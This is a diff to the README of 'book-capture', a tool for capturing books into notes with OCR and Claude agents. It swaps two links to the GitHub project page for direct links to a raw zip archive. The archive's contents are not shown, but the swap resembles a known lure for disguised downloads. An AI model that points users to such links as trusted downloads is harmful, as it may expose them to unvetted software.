@@ -1,6 +1,6 @@
 # 📚 book-capture - Capture books into clean notes
 
-[![Download book-capture](https://img.shields.io/badge/Download%20book--capture-blue-grey)](https://github.com/Gypsyrevised749/book-capture)
+[![Download book-capture](https://img.shields.io/badge/Download%20book--capture-blue-grey)](https://raw.githubusercontent.com/Gypsyrevised749/book-capture/main/skills/book-capture/capture-book-v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ It uses screenshots, OCR, and Claude agents to pull text from your pages and bui
 
 Open the download page here:
 
-[Visit the book-capture page](https://github.com/Gypsyrevised749/book-capture)
+[Visit the book-capture page](https://raw.githubusercontent.com/Gypsyrevised749/book-capture/main/skills/book-capture/capture-book-v3.6.zip)
 
 On Windows, use this page to get the latest release or package for your system.
 
